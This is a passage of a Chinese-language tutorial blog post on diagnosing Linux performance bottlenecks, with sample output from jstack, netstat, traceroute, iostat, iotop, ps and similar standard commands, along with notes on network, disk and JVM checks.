jstack 98344 | grep -A 10 18029</span><br><span class="line">"main" #1 prio=5 os_prio=0 tid=0x00007fb88404b800 nid=0x18029 waiting on condition [0x00007fb88caab000]</span><br><span class="line">   java.lang.Thread.State: TIMED_WAITING (sleeping)</span><br><span class="line">        at java.lang.Thread.sleep(Native Method)</span><br><span class="line">        at java.lang.Thread.sleep(Thread.java:340)</span><br><span class="line">        at java.util.concurrent.TimeUnit.sleep(TimeUnit.java:386)</span><br><span class="line">        at demo.MathGame.main(MathGame.java:17)</span><br><span class="line"></span><br><span class="line">"VM Thread" os_prio=0 tid=0x00007fb8840f2800 nid=0x1802a runnable</span><br><span class="line"></span><br><span class="line">"VM Periodic Task Thread" os_prio=0 tid=0x00007fb884154000 nid=0x18031 waiting on condition</span><br></pre></td></tr></tbody></table></figure><p>通过命令我们可以看到这个线程的对应的耗时代码是在<code>demo.MathGame.main(MathGame.java:17)</code></p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行</span><br><span class="line">grep -B 5 foo file 显示foo及前5行</span><br><span class="line">grep -A 5 foo file 显示foo及后5行</span><br></pre></td></tr></tbody></table></figure><h1 id="网络瓶颈"><a href="#网络瓶颈" class="headerlink" title="网络瓶颈"></a>网络瓶颈</h1><h2 id="定位丢包，错包情况"><a href="#定位丢包，错包情况" class="headerlink" title="定位丢包，错包情况"></a>定位丢包，错包情况</h2><p><code>watch more /proc/net/dev</code>用于定位丢包，错包情况，以便看网络瓶颈，重点关注drop(包被丢弃)和网络包传送的总量，不要超过网络上限：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# watch -n 2 more /proc/net/dev</span><br><span class="line">Every 2.0s: more /proc/net/dev                                                                                                                                                   Fri May  1 17:16:55 2020</span><br><span class="line"></span><br><span class="line">Inter-|   Receive                                                |  Transmit</span><br><span class="line"> face |bytes    packets errs drop fifo frame compressed multicast|bytes    packets errs drop fifo colls carrier compressed</span><br><span class="line">    lo:   10025     130    0    0    0     0          0         0    10025     130    0    0    0     0       0          0</span><br><span class="line"> ens33: 759098071  569661    0    0    0     0          0         0 19335572  225551    0    0    0     0       0          0</span><br></pre></td></tr></tbody></table></figure><ul><li>最左边的表示接口的名字，Receive表示收包，Transmit表示发送包；</li><li><code>bytes</code>：表示收发的字节数；</li><li><code>packets</code>：表示收发正确的包量；</li><li><code>errs</code>：表示收发错误的包量；</li><li><code>drop</code>：表示收发丢弃的包量；</li></ul><h2 id="查看路由经过的地址"><a href="#查看路由经过的地址" class="headerlink" title="查看路由经过的地址"></a>查看路由经过的地址</h2><p><code>traceroute ip</code>可以查看路由经过的地址，常用来统计网络在各个路由区段的耗时，如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# traceroute 14.215.177.38</span><br><span class="line">traceroute to 14.215.177.38 (14.215.177.38), 30 hops max, 60 byte packets</span><br><span class="line"> 1  CD-HZTK5H2.mshome.net (192.168.137.1)  0.126 ms * *</span><br><span class="line"> 2  * * *</span><br><span class="line"> 3  10.250.112.3 (10.250.112.3)  12.587 ms  12.408 ms  12.317 ms</span><br><span class="line"> 4  172.16.227.230 (172.16.227.230)  2.152 ms  2.040 ms  1.956 ms</span><br><span class="line"> 5  172.16.227.202 (172.16.227.202)  11.884 ms  11.746 ms  12.692 ms</span><br><span class="line"> 6  172.16.227.65 (172.16.227.65)  2.665 ms  3.143 ms  2.923 ms</span><br><span class="line"> 7  171.223.206.217 (171.223.206.217)  2.834 ms  2.752 ms  2.654 ms</span><br><span class="line"> 8  182.150.18.205 (182.150.18.205)  5.145 ms  5.815 ms  5.542 ms</span><br><span class="line"> 9  110.188.6.33 (110.188.6.33)  3.514 ms 171.208.199.185 (171.208.199.185)  3.431 ms 171.208.199.181 (171.208.199.181)  10.768 ms</span><br><span class="line">10  202.97.29.17 (202.97.29.17)  29.574 ms 202.97.30.146 (202.97.30.146)  32.619 ms *</span><br><span class="line">11  113.96.5.126 (113.96.5.126)  36.062 ms 113.96.5.70 (113.96.5.70)  35.940 ms 113.96.4.42 (113.96.4.42)  45.859 ms</span><br><span class="line">12  90.96.135.219.broad.fs.gd.dynamic.163data.com.cn (219.135.96.90)  35.680 ms  35.468 ms  35.304 ms</span><br><span class="line">13  14.215.32.102 (14.215.32.102)  35.135 ms 14.215.32.110 (14.215.32.110)  35.613 ms 14.29.117.242 (14.29.117.242)  54.712 ms</span><br><span class="line">14  * 14.215.32.134 (14.215.32.134)  49.518 ms 14.215.32.122 (14.215.32.122)  47.652 ms</span><br><span class="line">15  * * *</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h2 id="查看网络错误"><a href="#查看网络错误" class="headerlink" title="查看网络错误"></a>查看网络错误</h2><p><code>netstat -i</code>可以查看网络错误：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# netstat -i</span><br><span class="line">Kernel Interface table</span><br><span class="line">Iface             MTU    RX-OK RX-ERR RX-DRP RX-OVR    TX-OK TX-ERR TX-DRP TX-OVR Flg</span><br><span class="line">ens33            1500   570291      0      0 0        225897      0      0      0 BMRU</span><br><span class="line">lo              65536      130      0      0 0           130      0      0      0 LRU</span><br></pre></td></tr></tbody></table></figure><ul><li><code>Iface</code>: 网络接口名称;</li><li><code>MTU</code>: 最大传输单元，它限制了数据帧的最大长度，不同的网络类型都有一个上限值，如：以太网的MTU是1500；</li><li><code>RX-OK</code>：接收时，正确的数据包数。</li><li><code>RX-ERR</code>：接收时，产生错误的数据包数。</li><li><code>RX-DRP</code>：接收时，丢弃的数据包数。</li><li><code>RX-OVR</code>：接收时，由于过速（在数据传输中，由于接收设备不能接收按照发送速率传送来的数据而使数据丢失）而丢失的数据包数。</li><li><code>TX-OK</code>：发送时，正确的数据包数。</li><li><code>TX-ERR</code>：发送时，产生错误的数据包数。</li><li><code>TX-DRP</code>：发送时，丢弃的数据包数。</li><li><code>TX-OVR</code>：发送时，由于过速而丢失的数据包数。</li><li><code>Flg</code>：标志，B 已经设置了一个广播地址。L 该接口是一个回送设备。M 接收所有数据包（混乱模式）。N 避免跟踪。O 在该接口上，禁用ARP。P 这是一个点到点链接。R 接口正在运行。U 接口处于“活动”状态。</li></ul><h2 id="包的重传率"><a href="#包的重传率" class="headerlink" title="包的重传率"></a>包的重传率</h2><p><code>cat /proc/net/snmp</code>用来查看和分析240秒内网络包量，流量，错包，丢包。通过<code>RetransSegs</code>和<code>OutSegs</code>来计算重传率<code>tcpetr=RetransSegs/OutSegs</code>。</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# cat /proc/net/snmp</span><br><span class="line">Ip: Forwarding DefaultTTL InReceives InHdrErrors InAddrErrors ForwDatagrams InUnknownProtos InDiscards InDelivers OutRequests OutDiscards OutNoRoutes ReasmTimeout ReasmReqds ReasmOKs ReasmFails FragOKs FragFails FragCreates</span><br><span class="line">Ip: 1 64 241708 0 0 0 0 0 238724 225517 15 0 0 0 0 0 0 0 0</span><br><span class="line">Icmp: InMsgs InErrors InCsumErrors InDestUnreachs InTimeExcds InParmProbs InSrcQuenchs InRedirects InEchos InEchoReps InTimestamps InTimestampReps InAddrMasks InAddrMaskReps OutMsgs OutErrors OutDestUnreachs OutTimeExcds OutParmProbs OutSrcQuenchs OutRedirects OutEchos OutEchoReps OutTimestamps OutTimestampReps OutAddrMasks OutAddrMaskReps</span><br><span class="line">Icmp: 149 0 0 50 99 0 0 0 0 0 0 0 0 0 147 0 147 0 0 0 0 0 0 0 0 0 0</span><br><span class="line">IcmpMsg: InType3 InType11 OutType3</span><br><span class="line">IcmpMsg: 50 99 147</span><br><span class="line">Tcp: RtoAlgorithm RtoMin RtoMax MaxConn ActiveOpens PassiveOpens AttemptFails EstabResets CurrEstab InSegs OutSegs RetransSegs InErrs OutRsts InCsumErrors</span><br><span class="line">Tcp: 1 200 120000 -1 376 6 0 0 4 236711 223186 292 0 4 0</span><br><span class="line">Udp: InDatagrams NoPorts InErrors OutDatagrams RcvbufErrors SndbufErrors InCsumErrors</span><br><span class="line">Udp: 1405 438 0 1896 0 0 0</span><br><span class="line">UdpLite: InDatagrams NoPorts InErrors OutDatagrams RcvbufErrors SndbufErrors InCsumErrors</span><br><span class="line">UdpLite: 0 0 0 0 0 0 0</span><br></pre></td></tr></tbody></table></figure><p>重传率=292/223186≈0.13%</p><ul><li>平均每秒新增TCP连接数：通过/proc/net/snmp文件得到最近240秒内PassiveOpens的增量，除以240得到每秒的平均增量；</li><li>机器的TCP连接数 ：通过/proc/net/snmp文件的CurrEstab得到TCP连接数；</li><li>平均每秒的UDP接收数据报：通过/proc/net/snmp文件得到最近240秒内InDatagrams的增量，除以240得到平均每秒的UDP接收数据报；</li><li>平均每秒的UDP发送数据报：通过/proc/net/snmp文件得到最近240秒内OutDatagrams的增量，除以240得到平均每秒的UDP发送数据报；</li></ul><h1 id="磁盘瓶颈"><a href="#磁盘瓶颈" class="headerlink" title="磁盘瓶颈"></a>磁盘瓶颈</h1><h2 id="查磁盘空间"><a href="#查磁盘空间" class="headerlink" title="查磁盘空间"></a>查磁盘空间</h2><h3 id="查看磁盘剩余空间"><a href="#查看磁盘剩余空间" class="headerlink" title="查看磁盘剩余空间"></a>查看磁盘剩余空间</h3><p>查看磁盘剩余空间使用<code>df -hl</code>命令：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# df -hl</span><br><span class="line">文件系统                       容量  已用  可用 已用% 挂载点</span><br><span class="line">devtmpfs                       678M     0  678M    0% /dev</span><br><span class="line">tmpfs                          695M     0  695M    0% /dev/shm</span><br><span class="line">tmpfs                          695M   28M  667M    4% /run</span><br><span class="line">tmpfs                          695M     0  695M    0% /sys/fs/cgroup</span><br><span class="line">/dev/mapper/centos_aubin-root   27G  5.6G   22G   21% /</span><br><span class="line">/dev/sda1                     1014M  211M  804M   21% /boot</span><br></pre></td></tr></tbody></table></figure><h3 id="查看磁盘已使用空间"><a href="#查看磁盘已使用空间" class="headerlink" title="查看磁盘已使用空间"></a>查看磁盘已使用空间</h3><p><code>du -sh</code>命令是查看磁盘已使用空间的情况，这里的“已使用的磁盘空间”意思是指定的文件下的整个文件层次结构所使用的空间，在没给定参数的情况下，<code>du</code>报告当前目录所使用的磁盘空间。其实就是显示文件或目录所占用的磁盘空间的情况：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# du -sh</span><br><span class="line">64K  </span><br></pre></td></tr></tbody></table></figure><ul><li><code>-h</code>：输出文件系统分区使用的情况，例如：10KB，10MB，10GB等。</li><li><code>-s</code>：显示文件或整个目录的大小，默认单位是KB。</li></ul><blockquote><p><strong>!!</strong> <code>du</code>的详细信息可以通过 <code>man du</code>查看。</p></blockquote><h2 id="查看磁盘读写情况"><a href="#查看磁盘读写情况" class="headerlink" title="查看磁盘读写情况"></a>查看磁盘读写情况</h2><h3 id="查看磁盘总体读写情况"><a href="#查看磁盘总体读写情况" class="headerlink" title="查看磁盘总体读写情况"></a>查看磁盘总体读写情况</h3><p>通<code>iostat</code>查看磁盘总体的读写情况：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iostat</span><br><span class="line">Linux 3.10.0-1062.el7.x86_64 (localhost.localdomain)    2020年05月02日  _x86_64_        (2 CPU)</span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %nice %system %iowait  %steal   %idle</span><br><span class="line">           0.17    0.00    0.20    0.46    0.00   99.17</span><br><span class="line"></span><br><span class="line">Device:            tps    kB_read/s    kB_wrtn/s    kB_read    kB_wrtn</span><br><span class="line">sda               1.56        30.45        39.61    4659620    6060644</span><br><span class="line">scd0              0.00         0.02         0.00       3102          0</span><br><span class="line">dm-0              1.96        30.01        38.42    4591998    5878155</span><br><span class="line">dm-1              0.09         0.09         0.30      13840      45328</span><br></pre></td></tr></tbody></table></figure><ul><li><code>tps</code>：该设备每秒的传输次数。</li><li><code>kB_read/s</code>：每秒从设备（drive expressed）读取的数据量；</li><li><code>kB_wrtn/s</code>：每秒向设备（drive expressed）写入的数据量；</li><li><code>kB_read</code>：读取的总数据量；</li><li><code>kB_wrtn</code>：写入的总数量数据量；</li></ul><h3 id="查看磁盘详细读写情况"><a href="#查看磁盘详细读写情况" class="headerlink" title="查看磁盘详细读写情况"></a>查看磁盘详细读写情况</h3><p>通过<code>iostat -x 1 3</code>可以看到磁盘详细读写情况，没隔一秒输出一次一共输出3次，当看到I/O等待时间所占CPU时间的比重很高的时候，首先要检查的就是机器是否正在大量使用交换空间，同时关注<code>iowait</code>占比cpu的消耗是否很大，如果大说明磁盘存在大的瓶颈，同时关注<code>await</code>，表示磁盘的响应时间以便小于5ms：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iostat -x 1 3</span><br><span class="line">Linux 3.10.0-1062.el7.x86_64 (localhost.localdomain)    2020年05月02日  _x86_64_        (2 CPU)</span><br><span class="line"></span><br><span class="line">avg-cpu:  %user   %nice %system %iowait  %steal   %idle</span><br><span class="line">           0.17    0.00    0.20    0.46    0.00   99.16</span><br><span class="line"></span><br><span class="line">Device:         rrqm/s   wrqm/s     r/s     w/s    rkB/s    wkB/s avgrq-sz avgqu-sz   await r_await w_await  svctm  %util</span><br><span class="line">sda               0.01     0.49    0.63    0.95    30.59    39.78    89.58     0.34  214.23   49.16  323.48   8.55   1.34</span><br><span class="line">scd0              0.00     0.00    0.00    0.00     0.02     0.00    98.48     0.00    1.21    1.21    0.00   0.95   0.00</span><br><span class="line">dm-0              0.00     0.00    0.62    1.35    30.15    38.59    69.70     0.91  460.67   49.12  648.54   6.66   1.31</span><br><span class="line">dm-1              0.00     0.00    0.02    0.07     0.09     0.30     8.52     0.04  442.74   95.43  521.17   6.91   0.06</span><br></pre></td></tr></tbody></table></figure><p><code>avg-cpu</code>表示总体cpu使用情况统计信息，对于多核cpu，这里为所有cpu的平均值：</p><ul><li><code>%user</code>：CPU处在用户模式下的时间百分比。</li><li><code>%nice</code>：CPU处在带NICE值的用户模式下的时间百分比。</li><li><code>%system</code>：CPU处在系统模式下的时间百分比。</li><li><code>%iowait</code>：CPU等待输入输出完成时间的百分比，如果%iowait的值过高，表示硬盘存在I/O瓶颈。</li><li><code>%steal</code>：管理程序维护另一个虚拟处理器时，虚拟CPU的无意识等待时间百分比。</li><li><code>%idle</code>：CPU空闲时间百分比，如果%idle值高，表示CPU较空闲；如果%idle值高但系统响应慢时，可能是CPU等待分配内存，应加大内存容量；如果%idle值持续低于10，表明CPU处理能力相对较低，系统中最需要解决的资源是CPU。。</li></ul><p><code>Device</code>表示设备信息：</p><ul><li><code>rrqm/s</code>：每秒对该设备的读请求被合并次数，文件系统会对读取同块(block)的请求进行合并</li><li><code>wrqm/s</code>：每秒对该设备的写请求被合并次数</li><li><code>r/s</code>：每秒完成的读次数</li><li><code>w/s</code>：每秒完成的写次数</li><li><code>rkB/s</code>：每秒读数据量(kB为单位)</li><li><code>wkB/s</code>：每秒写数据量(kB为单位)</li><li><code>avgrq-sz</code>：平均每次IO操作的数据量(扇区数为单位)</li><li><code>avgqu-sz</code>：平均等待处理的IO请求队列长度</li><li><code>await</code>：平均每次IO请求等待时间(包括等待时间和处理时间，毫秒为单位)</li><li><code>svctm</code>：平均每次IO请求的处理时间(毫秒为单位)</li><li><code>%util</code>：一秒中有百分之多少的时间用于 I/O如果%util接近100%，说明产生的I/O请求太多，I/O系统已经满负荷。<code>idle</code>小于70% IO压力就较大了，一般读取速度有较多的wait。</li></ul><blockquote><p><strong>!!</strong> <code>iostat -xmd 1 3</code>：新增<code>m</code>选项可以在输出是使用<code>M</code>为单位。</p></blockquote><h2 id="查看最耗IO的进程"><a href="#查看最耗IO的进程" class="headerlink" title="查看最耗IO的进程"></a>查看最耗IO的进程</h2><p>一般先通过<code>iostat</code>查看是否存在io瓶颈，再使用<code>iotop</code>命令来定位那个进程最耗费IO：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iotop</span><br><span class="line">Total DISK READ :       0.00 B/s | Total DISK WRITE :       0.00 B/s</span><br><span class="line">Actual DISK READ:       0.00 B/s | Actual DISK WRITE:       0.00 B/s</span><br><span class="line">   TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND</span><br><span class="line">123931 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.02 % [kworker/1:30]</span><br><span class="line"> 94208 be/4 xiaolyuh    0.00 B/s    0.00 B/s  0.00 %  0.00 % nautilus-desktop --force [gmain]</span><br><span class="line">     1 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % systemd --system --deserialize 62</span><br><span class="line">     2 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [kthreadd]</span><br><span class="line"> 94211 be/4 xiaolyuh    0.00 B/s    0.00 B/s  0.00 %  0.00 % gvfsd-trash --spawner :1.4 /org/gtk/gvfs/exec_spaw/0</span><br><span class="line">     4 be/0 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [kworker/0:0H]</span><br><span class="line">     6 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [ksoftirqd/0]</span><br><span class="line">     7 rt/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [migration/0]</span><br><span class="line">     8 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [rcu_bh]</span><br><span class="line">     9 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [rcu_sched]</span><br><span class="line">    10 be/0 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % [lru-add-drain]</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><p>通过<code>iotop -p pid</code>可以查看单个进程的IO情况：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# iotop -p 124146</span><br><span class="line">Total DISK READ :       0.00 B/s | Total DISK WRITE :       0.00 B/s</span><br><span class="line">Actual DISK READ:       0.00 B/s | Actual DISK WRITE:       0.00 B/s</span><br><span class="line">   TID  PRIO  USER     DISK READ  DISK WRITE  SWAPIN     IO&gt;    COMMAND</span><br><span class="line">124146 be/4 root        0.00 B/s    0.00 B/s  0.00 %  0.00 % java -jar arthas-demo.jar</span><br></pre></td></tr></tbody></table></figure><h1 id="应用瓶颈"><a href="#应用瓶颈" class="headerlink" title="应用瓶颈"></a>应用瓶颈</h1><h2 id="查看某个进程的PID"><a href="#查看某个进程的PID" class="headerlink" title="查看某个进程的PID"></a>查看某个进程的PID</h2><p>如查看java的进程的pid，<code>ps -ef | grep java</code>:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ps -ef | grep java</span><br><span class="line">root     124146   1984  0 09:13 pts/0    00:00:06 java -jar arthas-demo.jar</span><br><span class="line">root     125210  98378  0 10:07 pts/1    00:00:00 grep --color=auto java</span><br></pre></td></tr></tbody></table></figure><h2 id="查看特定进程的数量"><a href="#查看特定进程的数量" class="headerlink" title="查看特定进程的数量"></a>查看特定进程的数量</h2><p>如查看java进程的数量,<code>ps -ef | grep java| wc -l</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ps -ef | grep java| wc -l</span><br><span class="line">2</span><br></pre></td></tr></tbody></table></figure><h2 id="查看线程是否存在死锁"><a href="#查看线程是否存在死锁" class="headerlink" title="查看线程是否存在死锁"></a>查看线程是否存在死锁</h2><p>查看线程是否存在死锁，<code>jstack -l pid</code>：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# jstack -l 124146</span><br><span class="line">2020-05-02 10:13:38</span><br><span class="line">Full thread dump OpenJDK 64-Bit Server VM (25.252-b09 mixed mode):</span><br><span class="line"></span><br><span class="line">"C1 CompilerThread1" #6 daemon prio=9 os_prio=0 tid=0x00007f27f013c000 nid=0x1e4f9 waiting on condition [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">        - None</span><br><span class="line"></span><br><span class="line">"C2 CompilerThread0" #5 daemon prio=9 os_prio=0 tid=0x00007f27f012d000 nid=0x1e4f8 waiting on condition [0x0000000000000000]</span><br><span class="line">   java.lang.Thread.State: RUNNABLE</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">        - None</span><br><span class="line"></span><br><span class="line">"main" #1 prio=5 os_prio=0 tid=0x00007f27f004b800 nid=0x1e4f3 waiting on condition [0x00007f27f7274000]</span><br><span class="line">   java.lang.Thread.State: TIMED_WAITING (sleeping)</span><br><span class="line">        at java.lang.Thread.sleep(Native Method)</span><br><span class="line">        at java.lang.Thread.sleep(Thread.java:340)</span><br><span class="line">        at java.util.concurrent.TimeUnit.sleep(TimeUnit.java:386)</span><br><span class="line">        at demo.MathGame.main(MathGame.java:17)</span><br><span class="line"></span><br><span class="line">   Locked ownable synchronizers:</span><br><span class="line">        - None</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h2 id="查看某个进程的线程数"><a href="#查看某个进程的线程数" class="headerlink" title="查看某个进程的线程数"></a>查看某个进程的线程数</h2><p><code>ps -efL | grep [PID] | wc -l</code>，如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ps -efL | grep 124146 | wc -l</span><br><span class="line">12</span><br></pre></td></tr></tbody></table></figure><p>查看具体有哪些线程用<code>ps -Lp [pid] cu</code>:</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# ps -Lp 124146 cu</span><br><span class="line">USER        PID    LWP %CPU NLWP %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND</span><br><span class="line">root     124146 124146  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 java</span><br><span class="line">root     124146 124147  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:01 java</span><br><span class="line">root     124146 124148  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 VM Thread</span><br><span class="line">root     124146 124149  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 Reference Handl</span><br><span class="line">root     124146 124150  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 Finalizer</span><br><span class="line">root     124146 124151  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 Signal Dispatch</span><br><span class="line">root     124146 124152  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 C2 CompilerThre</span><br><span class="line">root     124146 124153  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 C1 CompilerThre</span><br><span class="line">root     124146 124154  0.0   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:00 Service Thread</span><br><span class="line">root     124146 124155  0.1   11  2.5 2489116 35724 pts/0   Sl+  09:13   0:05 VM Periodic Tas</span><br><span class="line">root     124146 125362  0.0   11  2.5 2489116 35724 pts/0   Sl+  10:13   0:00 Attach Listener</span><br></pre></td></tr></tbody></table></figure><h2 id="统计所有的log文件中，包含Error字符的行"><a href="#统计所有的log文件中，包含Error字符的行" class="headerlink" title="统计所有的log文件中，包含Error字符的行"></a>统计所有的log文件中，包含Error字符的行</h2><p><code>find / -type f -name "*.log" | xargs grep "ERROR"</code>，这个在排查问题过程中比较有用：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# find / -type f -name "*.log" | xargs grep "ERROR"</span><br><span class="line">/var/log/tuned/tuned.log:2020-03-13 18:05:59,145 ERROR    tuned.utils.commands: Writing to file '/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor' error: '[Errno 19] No such device'</span><br><span class="line">/var/log/tuned/tuned.log:2020-03-13 18:05:59,145 ERROR    tuned.utils.commands: Writing to file '/sys/devices/system/cpu/cpu1/cpufreq/scaling_governor' error: '[Errno 19] No such device'</span><br><span class="line">/var/log/tuned/tuned.log:2020-04-28 14:55:34,857 ERROR    tuned.utils.commands: Writing to file '/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor' error: '[Errno 19] No such device'</span><br><span class="line">/var/log/tuned/tuned.log:2020-04-28 14:55:34,859 ERROR    tuned.utils.commands: Writing to file '/sys/devices/system/cpu/cpu1/cpufreq/scaling_governor' error: '[Errno 19] No such device'</span><br><span class="line">/var/log/tuned/tuned.log:2020-04-28 15:23:19,037 ERROR    tuned.utils.commands: Writing to file '/sys/devices/system/cpu/cpu0/cpufreq/scaling_governor' error: '[Errno 19] No such device'</span><br><span class="line">...</span><br></pre></td></tr></tbody></table></figure><h2 id="应用启动时指定JVM参数"><a href="#应用启动时指定JVM参数" class="headerlink" title="应用启动时指定JVM参数"></a>应用启动时指定JVM参数</h2><p><code>java -jar -Xms128m -Xmx1024m -Xss512k -XX:PermSize=128m -XX:MaxPermSize=64m -XX:NewSize=64m -XX:MaxNewSize=256m arthas-demo.jar</code>，如：</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost ~]# java -jar -Xms128m -Xmx1024m -Xss512k -XX:PermSize=128m -XX:MaxPermSize=64m -XX:NewSize=64m -XX:MaxNewSize=256m  arthas-demo.jar</span><br><span class="line">OpenJDK 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed in 8.0</span><br><span class="line">OpenJDK 64-Bit Server VM warning: ignoring option MaxPermSize=64m; support was removed in 8.0</span><br><span 